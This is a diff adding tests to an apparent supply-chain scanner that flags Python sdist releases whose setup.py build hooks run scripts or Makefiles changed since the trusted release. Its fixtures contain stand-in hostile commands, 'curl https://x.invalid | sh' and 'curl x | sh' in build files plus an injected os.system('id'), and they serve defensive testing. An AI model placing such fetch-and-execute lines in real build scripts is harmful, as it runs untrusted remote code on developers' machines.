@@ -703,6 +703,85 @@ def test_a_trusted_call_made_through_an_alias_matches_and_a_swapped_one_warns() 
     ]
 
 
+def test_a_script_setup_py_runs_that_changed_on_its_own_warns() -> None:
+    """The call is the same in both releases; the file it runs isn't."""
+    hook = DOCS_HOOK.format(args="['sh', './tools/build.sh']")
+    base = {**SRC, "setup.py": hook, "tools/build.sh": "make docs\n"}
+    same = _c002_files(base, {**base, "demo/__init__.py": INIT + "# 1.1\n"})
+    assert same == []
+    [f] = _c002_files(base, {**base, "tools/build.sh": "curl https://x.invalid | sh\n"})
+    assert f.severity is Severity.WARN
+    assert f.title == "1.1 changes code that runs when the sdist is built"
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:7 calls subprocess.call(['sh', './tools/build.sh']) (in BuildDocs.run()) as "
+        "1.0 did, but tools/build.sh changed since 1.0"
+    ]
+    # A file the call names that the trusted sdist didn't have, and the
+    # Makefile behind a ``make``, count too; a word that names no file doesn't.
+    hook = DOCS_HOOK.format(args="'make docs && python gen.py'")
+    base = {**SRC, "setup.py": hook, "Makefile": "docs:\n\techo\n"}
+    [f] = _c002_files(base, {**base, "Makefile": "docs:\n\tcurl x | sh\n", "gen.py": "pass\n"})
+    assert f.evidence[0].summary == (
+        "setup.py:7 calls subprocess.call('make docs && python gen.py') (in BuildDocs.run()) as "
+        "1.0 did, but Makefile changed since 1.0 and gen.py is new in 1.1"
+    )
+    # The ``cwd`` keyword says which directory the files are in: here
+    # vendor/Makefile, not the top-level one. A ``cwd`` the rule can't read
+    # (a computed path) leaves nothing to look up, and nothing is reported.
+    hook = DOCS_HOOK.format(args="['make'], cwd='vendor'")
+    make = "all:\n\techo\n"
+    base = {**SRC, "setup.py": hook, "Makefile": make, "vendor/Makefile": make}
+    assert _c002_files(base, {**base, "Makefile": "all:\n\tcurl x | sh\n"}) == []
+    [f] = _c002_files(base, {**base, "vendor/Makefile": "all:\n\tcurl x | sh\n"})
+    assert f.evidence[0].summary == (
+        "setup.py:7 calls subprocess.call(['make'], cwd='vendor') (in BuildDocs.run()) as "
+        "1.0 did, but vendor/Makefile changed since 1.0"
+    )
+    hook = "import os\n" + DOCS_HOOK.format(args="['make'], cwd=os.path.dirname(__file__)")
+    base = {**SRC, "setup.py": hook, "Makefile": make}
+    assert _c002_files(base, {**base, "Makefile": "all:\n\tcurl x | sh\n"}) == []
+
+
+def test_a_named_file_that_isnt_a_build_script_doesnt_count() -> None:
+    """The top-1,000 corpus's three everyday shapes: setup.py naming itself,
+    data a call reads or writes, and the release's own module (which the
+    content rules read already). A script outside the package still counts."""
+    hook = DOCS_HOOK.format(
+        args="'python setup.py sdist && sed -i s/x/y/ pyproject.toml && python -c \"exec(open(\\'demo/_version.py\\').read())\"'"
+    )
+    base = {
+        **SRC,
+        "setup.py": hook,
+        "pyproject.toml": "[project]\n",
+        "demo/_version.py": "v = '1.0'\n",
+        ".gitrev": "abc\n",
+    }
+    cand = {
+        **base,
+        "setup.py": hook + "# 1.1\n",
+        "pyproject.toml": "[project]\nname='demo'\n",
+        "demo/_version.py": "v = '1.1'\n",
+        ".gitrev": "def\n",
+    }
+    assert _c002_files(base, cand) == []
+    # A single-module project's own module, under src/ or not, is its own too.
+    one = {
+        "setup.py": DOCS_HOOK.format(args="'python -c \"exec(open(\\'src/demo.py\\').read())\"'")
+    }
+    assert _c002_files({**one, "src/demo.py": "a = 1\n"}, {**one, "src/demo.py": "a = 2\n"}) == []
+    # A Python script outside the package, named the same way, counts.
+    two = {**SRC, "setup.py": DOCS_HOOK.format(args="[sys.executable, 'scripts/fetch.py']")}
+    [f] = _c002_files(
+        {**two, "scripts/fetch.py": "a = 1\n"}, {**two, "scripts/fetch.py": "a = 2\n"}
+    )
+    assert f.evidence[0].summary.endswith("as 1.0 did, but scripts/fetch.py changed since 1.0")
+
+
+def _c002_files(base: dict[str, str], cand: dict[str, str]):
+    result = run_checks(CHANGE, _sdist("1.0", base), _sdist("1.1", cand))
+    return [f for f in result.findings if f.rule_id == "GRN-C002"]
+
+
 def test_new_callee_and_changed_arguments_are_reported_together() -> None:
     base = DOCS_HOOK.format(args="['make', 'docs']")
     cand = "import os\n" + DOCS_HOOK.format(args="['make', 'docs', 'upload']") + "os.system('id')\n"
